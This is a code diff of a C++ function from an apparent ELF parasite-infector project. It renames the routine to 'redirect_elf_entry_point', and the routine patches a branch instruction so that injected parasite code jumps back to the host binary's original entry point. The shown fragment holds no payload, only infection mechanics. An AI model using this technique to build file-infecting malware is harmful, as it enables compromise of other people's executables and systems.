@@ -1,10 +1,10 @@
 #include "common/patch_pattern.hh"
-#include "common/patch_relinguish_control.hh"
+#include "common/redirect_elf_entry_point.hh"
 #include "nostdlib/stdio.hh"
 
 namespace vt::common {
 
-bool patch_parasite_and_relinquish_control(
+bool redirect_elf_entry_point(
     Elf64_Half binary_type, Elf64_Addr original_entry_point,
     Elf64_Addr parasite_load_address, size_t parasite_offset,
     size_t parasite_size, vt::common::Mmap<PROT_READ | PROT_WRITE>& mapping) {
@@ -33,7 +33,8 @@ bool patch_parasite_and_relinquish_control(
   } else if (binary_type == ET_DYN) {
     // Both original and parasite offset are relative address to the process
     // start, which is not known until runtime.
-    rel = original_entry_point - (parasite_offset + patch_offset_from_parasite_start);
+    rel = original_entry_point -
+          (parasite_offset + patch_offset_from_parasite_start);
   } else {
     CHECK_FAIL();
   }
@@ -44,10 +45,9 @@ bool patch_parasite_and_relinquish_control(
 
   *inst = rel;
 
-    *inst &= 0b11111111111111111111111111;
+  *inst &= 0b11111111111111111111111111;
   // fill in op-code
   constexpr auto op_code = 0b00010100000000000000000000000000;
-
 
   *inst |= (op_code);
 
